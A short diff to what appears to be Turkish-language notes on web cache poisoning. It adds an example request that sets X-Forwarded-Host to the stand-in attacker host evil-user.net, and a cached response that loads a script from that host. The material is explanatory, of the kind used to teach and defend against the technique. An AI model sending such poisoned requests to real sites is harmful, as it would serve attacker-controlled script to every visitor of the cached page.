@@ -116,3 +116,17 @@ Cache-Control: public
 - Cache key aynı (çünkü X-Forwarded-Host cache key’e dahil değil).
 - Cache bunu saklar ve artık tüm kullanıcılar /en?region=uk çağırdığında zehirlenmiş response alır.
 
+Başka Örnek:
+Request:
+```
+GET / HTTP/1.1
+Host: innocent-website.com
+X-Forwarded-Host: evil-user.net
+User-Agent: Mozilla/5.0 Firefox/57.0
+```
+
+Response:
+```
+HTTP/1.1 200 OK
+<script src="https://evil-user.net/static/analytics.js"></script>
+```
